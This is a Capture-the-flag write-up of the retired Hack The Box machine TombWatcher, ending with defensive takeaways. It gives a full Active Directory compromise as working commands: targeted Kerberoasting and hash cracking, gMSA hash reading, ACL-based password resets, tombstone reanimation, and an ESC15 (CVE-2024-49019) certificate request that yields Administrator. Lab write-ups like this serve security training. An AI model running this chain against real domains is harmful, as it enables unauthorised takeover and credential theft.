---
title: "TombWatcher — HackTheBox Writeup"
date: 2026-04-29
author: "Angus Dawson"
tags: ["HTB","Windows","Active Directory","BloodHound","Kerberos","Kerberoasting","gMSA","AD CS","ESC15","CVE-2024-49019","Tombstone","Privilege Escalation"]
categories: ["CTF Writeups"]
difficulty: "Medium"
platform: "Hack The Box"
os: "Windows"
featured: true
featured_weight: 1
summary: "A Windows domain box where a chain of small misconfigurations adds up to full control, ending in an Active Directory certificate template flaw. Henry → targeted Kerberoast on Alfred → AddSelf to INFRASTRUCTURE → ReadGMSAPassword on ansible_dev$ → Sam → John → WinRM pivot → reanimate tombstoned cert_admin via John's GenericAll on OU=ADCS → ESC15 (CVE-2024-49019) on the WebServer template → Administrator."
images: ["/images/tombwatcher/Tombwatcher.webp"]
cover:
  image: "/images/tombwatcher/Tombwatcher.webp"
  alt: "TombWatcher HTB image"
  caption: "TombWatcher - CTF - Hack The Box"
  relative: true
  hidden: false

---

> ⚠️ **Spoiler warning**: This covers a retired HTB machine. This writeup documents my playthrough of the retired Hack The Box machine **TombWatcher**.

The VPN IPs shown below are the HTB-assigned VPN addresses used during the box (left intact here for reproducibility). Do not attempt this on non-authorised or active systems.

# TombWatcher (HTB) — Walkthrough

## Overview
- **Platform:** Hack The Box (retired)
- **Target OS:** Windows Server 2019 — Active Directory Domain Controller (with AD CS)
- **Focus:** WriteSPN-driven targeted Kerberoasting → group AddSelf → gMSA password read → ACL chain through Sam and John → WinRM pivot → tombstone reanimation of a deleted CA operator → ESC15 (CVE-2024-49019) on the default `WebServer` template → Domain Admin.
- **Difficulty:** Medium

---

## Recon

Initial scan:

```bash
nmap -sV -sC -oN scans/tombwatcher-initial 10.129.232.167
```

**Result highlights (relevant lines)**

```text
53/tcp    open  domain         Simple DNS Plus
88/tcp    open  kerberos-sec   Microsoft Windows Kerberos
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap           Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  ncacn_http
636/tcp   open  ldapssl
3268/tcp  open  ldap           Global Catalog
3269/tcp  open  ldapssl        Global Catalog
5985/tcp  open  http           Microsoft HTTPAPI (WinRM)
```

The full Kerberos + LDAP + Global-Catalog set confirms a **Domain Controller**, and the TLS certificate on 636/3269 disclosed the domain (`tombwatcher.htb`) and the DC hostname (`DC01`). Add the host to `/etc/hosts` so Kerberos and LDAPS work cleanly:

```bash
echo '10.129.232.167  dc01.tombwatcher.htb tombwatcher.htb' | sudo tee -a /etc/hosts
```

![Nmap scan against the DC](/images/tombwatcher/Kali-2025-2026-05-09-13-12-56.png)

![Nmap results enumerating the AD service set](/images/tombwatcher/Kali-2025-2026-05-09-13-13-57.png)

---

## Initial credentials & enumeration as henry

The box gives a starting credential:

```text
henry : H3nry_987TGV!
```

Kick off BloodHound collection directly against the DC:

```bash
bloodhound-python -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' \
  -ns 10.129.232.167 -c All --zip
```

![bloodhound-python collecting the domain](/images/tombwatcher/Kali-2025-2026-05-09-13-15-02.png)

Validate against SMB and dump users over LDAP for later targeting:

```bash
nxc smb DC01.tombwatcher.htb -u henry -p 'H3nry_987TGV!'
nxc smb DC01.tombwatcher.htb -u henry -p 'H3nry_987TGV!' --users
```

The user list surfaces the cast we'll work through: `henry`, `alfred`, `sam`, `john`, plus the `ansible_dev$` gMSA and `Administrator`.

![nxc dumping the domain user list](/images/tombwatcher/Kali-2025-2026-05-09-13-16-43.png)

---

## BloodHound: henry → Alfred (WriteSPN)

Import the zip into BloodHound CE and mark `henry` as **Owned**. The outbound edge that matters is:

```text
HENRY --[WriteSPN]--> ALFRED
```

`WriteSPN` lets `henry` write the `servicePrincipalName` attribute on the `alfred` user object. Alfred isn't kerberoastable today, but if we plant an SPN on the account we can request a TGS for it, get back a hash encrypted with Alfred's password-derived key, and crack it offline. That's the **targeted Kerberoasting** primitive.

![BloodHound WriteSPN edge from Henry to Alfred](/images/tombwatcher/bloodhound_writeSPN.webp)

---

## Targeted Kerberoast: Alfred

The cleanest tool for this from Linux is `targetedKerberoast.py` — it walks every principal you have `WriteSPN` on, sets a temporary SPN, requests the TGS, then reverts the SPN.

```bash
targetedKerberoast.py -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' \
  --dc-ip 10.129.232.167 --request-user alfred
```

The script prints a hashcat-format `$krb5tgs$23$*alfred$...` line and confirms the SPN was cleaned up.

![targetedKerberoast extracting Alfred's TGS](/images/tombwatcher/targetedKerberoast_alfred.png)

Crack with hashcat against rockyou:

```bash
hashcat -m 13100 -a 0 alfred.tgs /usr/share/wordlists/rockyou.txt --force
```

Alfred's password falls out: `basketball`.

![hashcat cracking Alfred's TGS](/images/tombwatcher/hashcat_alfred.png)

---

## INFRASTRUCTURE group: AddSelf abuse

Re-running BloodHound with `alfred` marked Owned shows the next edge:

```text
ALFRED --[AddSelf]--> INFRASTRUCTURE  (group)
```

`AddSelf` is the narrowest possible group-write right. Alfred can add only himself to the group, nothing else. That's enough, because the group itself holds the privilege we want.

```bash
bloodyad --host dc01.tombwatcher.htb -d tombwatcher.htb \
  -u alfred -p 'basketball' add groupMember INFRASTRUCTURE alfred
```

```text
[+] alfred added to INFRASTRUCTURE
```

![bloodyad adding Alfred to INFRASTRUCTURE](/images/tombwatcher/bloodyAD_alfred.png)

---

## ReadGMSAPassword: ansible_dev$

The reason we wanted into `INFRASTRUCTURE` is the next BloodHound edge:

```text
INFRASTRUCTURE --[ReadGMSAPassword]--> ansible_dev$
```

`ansible_dev$` is a Group Managed Service Account — its password is a 240-byte blob auto-rotated by AD and stored in the `msDS-ManagedPassword` attribute, readable only by principals listed in `msDS-GroupMSAMembership`. INFRASTRUCTURE is now in that list, so we are too.

```bash
nxc ldap dc01.tombwatcher.htb -u alfred -p 'basketball' --gmsa
```

The output gives the NT hash for `ansible_dev$` along with the `PrincipalsAllowedToReadPassword: Infrastructure` confirmation:

```text
Account: ansible_dev$   NTLM: cba56cd2df7d642f622e2a59956f6d47   PrincipalsAllowedToReadPassword: Infrastructure
```

![gMSA dump returning ansible_dev$ NT hash](/images/tombwatcher/gmsa.png)

Validate the hash against SMB to confirm we can authenticate as the gMSA:

```bash
nxc smb DC01.tombwatcher.htb -u 'ANSIBLE_DEV$' -H cba56cd2df7d642f622e2a59956f6d47
```

![Pass-the-hash as ansible_dev$ confirmed](/images/tombwatcher/validate_ntlm.png)

---

## ansible_dev$ → Sam

Re-collecting BloodHound as `ansible_dev$` surfaces a direct password-reset edge onto **sam**. `bloodyad` lets us drive the whole abuse with the gMSA hash — no plaintext, no separate ownership step:

```bash
bloodyad --host dc01.tombwatcher.htb -d tombwatcher.htb \
  -u 'ANSIBLE_DEV$' -p ':cba56cd2df7d642f622e2a59956f6d47' \
  set password "sam" 'Password123!'
```

```text
[+] Password changed successfully!
```

Validate:

```bash
nxc smb DC01.tombwatcher.htb -u sam -p 'Password123!'
```

![Resetting Sam's password and validating](/images/tombwatcher/sam_password_reset-and-validate.png)

---

## Sam → John (WriteOwner)

BloodHound's next outbound edge from `sam` is **WriteOwner** onto `john`. WriteOwner doesn't let you reset the password directly. It makes you the object owner, after which you can grant yourself the missing rights. `bloodyad` exposes the first half as `set owner`:

```bash
bloodyad -d tombwatcher.htb -u sam -p 'Password123!' \
  --host dc01.tombwatcher.htb set owner john sam
```

```text
[+] Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by sam on john
```

![Sam taking ownership of John](/images/tombwatcher/sam_genericall_john.png)

With ownership, grant `sam` full control over `john`, then reset John's password:

```bash
bloodyad -d tombwatcher.htb -u sam -p 'Password123!' \
  --host dc01.tombwatcher.htb add genericAll john sam

bloodyad -d tombwatcher.htb -u sam -p 'Password123!' \
  --host dc01.tombwatcher.htb set password john 'Password123!'
```

Validate:

```bash
nxc smb DC01.tombwatcher.htb -u john -p 'Password123!'
```

---

## WinRM as john — user flag & beachhead

John is a member of `Remote Management Users`, so WinRM is open:

```bash
evil-winrm -i dc01.tombwatcher.htb -u 'john' -p 'Password123!'
```

![Evil-WinRM landing as john](/images/tombwatcher/evil-winrm_john.png)

The user flag is on John's desktop:

```interactive shell
*Evil-WinRM* PS C:\Users\john\Desktop> type user.txt
```

`<user-flag-here>`

![User flag from John's desktop](/images/tombwatcher/user-flag.png)

We'll keep this PowerShell session; it's the cleanest way to reanimate the tombstoned `cert_admin` object next.

---

## Reanimating the tombstoned cert_admin

John's outbound rights look unremarkable until you check the OU edges. BloodHound shows:

```text
JOHN --[GenericAll]--> OU=ADCS,DC=tombwatcher,DC=htb
```

`GenericAll` on a container/OU includes the `Reanimate-Tombstone` extended right on its children. That matters because if you list deleted objects in the directory you'll find one suspicious entry:

```powershell
Get-ADObject -IncludeDeletedObjects -Filter { Name -like 'cert_admin*' } `
  -Properties lastKnownParent,isDeleted,distinguishedName
```

`lastKnownParent` is `OU=ADCS,DC=tombwatcher,DC=htb` — exactly the scope where John's `GenericAll` lets him reanimate the object. Restore it by its ObjectGUID, then confirm the user is back in `OU=ADCS`:

```powershell
Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
Get-ADUser cert_admin
```

```text
DistinguishedName : CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb
Enabled           : True
Name              : cert_admin
SamAccountName    : cert_admin
```

A reanimated object comes back without a usable password, but John's `GenericAll` on the parent OU is inherited onto the restored child, so we can set one in the same shell:

```powershell
Set-ADAccountPassword cert_admin -NewPassword `
  (ConvertTo-SecureString 'P@ssword123!' -AsPlainText -Force) -Force
```

![Restore-ADObject reanimating cert_admin and setting its password](/images/tombwatcher/password-change-cert-admin.png)

Validate from Linux:

```bash
nxc smb DC01.tombwatcher.htb -u cert_admin -p 'P@ssword123!'
```

![cert_admin authentication validated](/images/tombwatcher/cert-admin-validate.png)

---

## AD CS recon: WebServer template (ESC15)

`cert_admin` has enrolment rights inside the CA, which is the whole reason it exists. Enumerate templates with Certipy:

```bash
certipy-ad find -u cert_admin -p 'P@ssword123!' \
  -dc-ip 10.129.232.167 -vulnerable -enabled -stdout
```

![certipy-ad find against the CA](/images/tombwatcher/certipy-ad.png)

The hit is the default **`WebServer`** template, flagged as ESC15:

```text
[+] User Enrollable Principals : TOMBWATCHER.HTB\cert_admin
[!] Vulnerabilities
    ESC15                      : Enrollee supplies subject and schema version is 1.
[*] Remarks
    ESC15                      : Only applicable if the environment has not been patched.
                                 See CVE-2024-49019 or the wiki for more details.
```

![ESC15 callout in certipy output](/images/tombwatcher/ESC15.png)

**Why this is exploitable.** Schema **v1** templates predate the `mspki-certificate-application-policy` attribute, so the CA does not enforce server-side filtering of Application Policy OIDs supplied at request time. A schema-v1 template like `WebServer` that any low-priv user can enrol on therefore lets the requester inject **Client Authentication** as an application policy, even though the template itself only lists Server Authentication. Combined with the SAN/UPN smuggling allowed in the same request, this is enough to get a client-auth certificate for any principal — including `Administrator` — and PKINIT to the KDC as them. SpecterOps/Microsoft track this as **CVE-2024-49019** ("EKUwu") and Certipy as **ESC15**.

---

## ESC15 exploitation

Request the certificate, smuggling in `Client Authentication` as an application policy and `administrator@tombwatcher.htb` as the UPN:

```bash
certipy-ad req \
  -u 'cert_admin@tombwatcher.htb' -p 'P@ssword123!' \
  -dc-ip '10.129.232.167' -target 'DC01.tombwatcher.htb' \
  -ca 'tombwatcher-CA-1' -template 'WebServer' \
  -upn 'administrator@tombwatcher.htb' \
  -application-policies 'Client Authentication'
```

Certipy saves the resulting key + certificate as `administrator.pfx`:

```text
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@tombwatcher.htb'
[!] Certificate has no object SID
[*] Saving certificate and private key to 'administrator.pfx'
```

![certipy-ad req producing administrator.pfx](/images/tombwatcher/privilege_esc.png)

Authenticate with the PFX via PKINIT and drop into Certipy's LDAP shell as Administrator — no NT hash needed:

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.232.167 -ldap-shell
```

From the LDAP shell, set a new password on the `Administrator` account directly:

```text
# change_password administrator P@ssword123!
Got User DN: CN=Administrator,CN=Users,DC=tombwatcher,DC=htb
Attempting to set new password of: P@ssword123!
Password changed successfully!
```

![certipy auth -ldap-shell resetting Administrator's password](/images/tombwatcher/priv_esc2_ldap-shell.png)

---

## Administrator shell & root flag

Evil-WinRM in with the new credential:

```bash
evil-winrm -i 10.129.232.167 -u 'administrator' -p 'P@ssword123!'
```

```interactive shell
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\desktop\root.txt
```

`<root-flag-here>`

![Evil-WinRM as Administrator and the root flag](/images/tombwatcher/evil-winrm_admin-root-flag.png)

---

## Takeaways

- **`WriteSPN` is a sleeper Kerberoast primitive.** BloodHound surfaces it, but it's easy to dismiss because the target account isn't roastable *yet*. Audit `WriteSPN` the same way you audit `GenericWrite`.
- **`AddSelf` turns one ACL into a group's worth of rights.** It's the most innocuous-looking group write right and the easiest to overlook in a Tier-0 review — TombWatcher exists because INFRASTRUCTURE held a powerful right that AddSelf inherited.
- **`ReadGMSAPassword` is Tier-0.** A gMSA whose password any pivot user can read is functionally a shared local-admin account. Treat the `msDS-GroupMSAMembership` ACL as carefully as Domain Admins membership.
- **WriteOwner is a two-step takeover.** It doesn't reset the password directly; you take ownership, grant yourself DACL writes, *then* reset. That's three log lines a defender could catch if they were watching the right SACLs.
- **Tombstone reanimation is a stealthy primitive.** Default Windows auditing rarely flags `Restore-ADObject`, and the restored object inherits the OU's ACLs cleanly — it's a great persistence/recovery pattern that almost no defender monitors. Audit `GenericAll` on OUs that contain privileged accounts.
- **ESC15 / CVE-2024-49019 lives on default templates.** `WebServer` ships with every CA and is schema v1 — exactly the conditions for application-policy injection. Migrate v1 templates to v2/v3 or remove low-priv enrolment rights.

---

## Resources

- [Certipy](https://github.com/ly4k/Certipy) — `find`, `req`, `auth`, `-ldap-shell`, ESC15 support
- [BloodHound CE — SpecterOps](https://bloodhound.specterops.io/)
- [bloodyAD](https://github.com/CravateRouge/bloodyAD) — ACL abuse, ownership transfer, gMSA, password reset
- [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast) — WriteSPN abuse
- [SpecterOps — ESC15 / EKUwu (CVE-2024-49019)](https://posts.specterops.io/ekuwu-not-just-another-ad-cs-esc-3438213e9079)
- [Microsoft — Restoring deleted Active Directory objects](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd379542(v=ws.10))
- [MITRE ATT&CK T1558.003 — Kerberoasting](https://attack.mitre.org/techniques/T1558/003/)
- Hack The Box — retired machines archive
